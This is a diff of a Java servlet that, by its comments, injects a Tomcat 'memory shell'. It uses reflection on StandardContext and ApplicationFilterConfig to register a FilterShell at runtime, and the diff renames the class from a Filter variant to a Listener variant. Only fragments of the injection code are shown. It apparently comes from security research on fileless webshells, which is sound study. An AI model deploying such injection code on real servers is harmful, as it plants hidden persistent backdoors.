@@ -1,17 +1,13 @@
 package cn.safe6.servlet;
 
 import cn.safe6.filter.FilterShell;
-import org.apache.catalina.Container;
 import org.apache.catalina.Context;
-import org.apache.catalina.Wrapper;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.core.StandardWrapper;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
 
-import javax.servlet.FilterConfig;
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
@@ -22,14 +18,13 @@ import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Modifier;
-import java.util.HashMap;
 import java.util.Map;
 
 /**
- * Filter内存马添加
+ * Listener内存马添加
  */
-@WebServlet("/add2")
-public class AddShellServlet2 extends HttpServlet {
+@WebServlet("/add3")
+public class AddShellServlet3 extends HttpServlet {
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
@@ -85,7 +80,7 @@ public class AddShellServlet2 extends HttpServlet {
             //Class<?> ac1 = this.getClass().getClassLoader().loadClass("org.apache.catalina.core.ApplicationFilterConfig");
 
             //构造方法不是public的
-            Constructor constructor = ac.getDeclaredConstructor(org.apache.catalina.Context.class,org.apache.tomcat.util.descriptor.web.FilterDef.class);
+            Constructor constructor = ac.getDeclaredConstructor(Context.class, FilterDef.class);
             constructor.setAccessible(true);
             ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
 
